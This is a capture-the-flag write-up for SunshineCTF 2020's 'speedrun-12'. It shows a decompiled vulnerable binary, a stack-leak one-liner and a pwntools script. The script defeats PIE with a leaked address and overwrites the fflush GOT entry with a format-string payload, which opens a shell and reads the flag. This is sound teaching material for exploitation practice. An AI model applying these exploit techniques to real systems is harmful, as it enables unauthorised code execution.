# **speedrun-12**
## Task
nc chal.2020.sunshinectf.org 30012
File: chall_12
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
* No RELRO assume overwrite GOT
* No canary assume BOF
* System 32 bit

### Decompile with ghidra
```c
void main(void)
{
  char local_24 [20];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  printf("Just a single second: %p\n",main);
  fgets(local_24,0x13,stdin);
  vuln();
  return;
}

void vuln(void)
{
  char local_d4 [204];
  
  fgets(local_d4,199,stdin);
  printf(local_d4);
  fflush(stdin);
  return;
}

void win(void)
{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0x167));
  return;
}
```
The same format string vulnerability with [speedrun-11](). however now the local address differentiate with the server, so we use the leaking address `main` in `main` function to define the server address function
### Exploit
```bash
python3 -c "print('\nAAAABBBB'+ '%x '*100)"| ./chall_12 > res.txt                                                                                                                                                                  res.txt >
Just a single second: 0x5663f639
AAAABBBBc7 f7eca580 5663f5e7 0 0 41414141 42424242 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 56002520 ffd2fd2c 566409ec ffd2fd48 5663f68e f7eca3fc 566409ec ffd2fe0c 5663000a 
```
```python
from pwn import *

binary = context.binary = ELF('./chall_12')
offset = 0
# the first part to caculate the stack parameter offset 
f = open('res.txt')
for line in f:
    for word in line.split():
        offset += 1
        print(word,end = ' ')
        if word == '41414141':
            break
f = open('res.txt')
sub = len(f.readline().split())
print('sub: ', sub)
offset -= sub

print('Offset: ', offset)
p = remote('chal.2020.sunshinectf.org',30012)
p.recvuntil('Just a single second: ')
realmain = int(p.recvline().strip(),16)
print('Main real: ', realmain)

buffer_func_win = binary.sym.main - binary.sym.win
buffer_func_fflush = binary.got.fflush - binary.sym.main

payload = b''
payload = fmtstr_payload(offset,{realmain+buffer_func_fflush:realmain-buffer_func_win})
print('Payload: ',payload)
p.sendline('IxZ')
p.sendline(payload)
p.interactive()
```
### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_12'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
Just a single second: 0x565fb639 AAAABBBBc7 f7eea580 565fb5e7 0 0 41414141 sub:  5
Offset:  6
[+] Opening connection to chal.2020.sunshinectf.org on port 30012: Done
Main real:  1449158201
Payload:  b'%86c%17$hhn%10c%18$hhn%5c%19$hhn%72c%20$hhna\xffy`V\xfey`V\xfdy`V\xfcy`V'
[*] Switching to interactive mode
                                                                                     \xc7         \xa0    \xe7                                                                       \xb7a\xffy`V\xfey`V\xfdy`V\xfcy`V
$ ls
chall_12
flag.txt
$ cat flag.txt
sun{the-stage-351efbcaebfda0d5}
```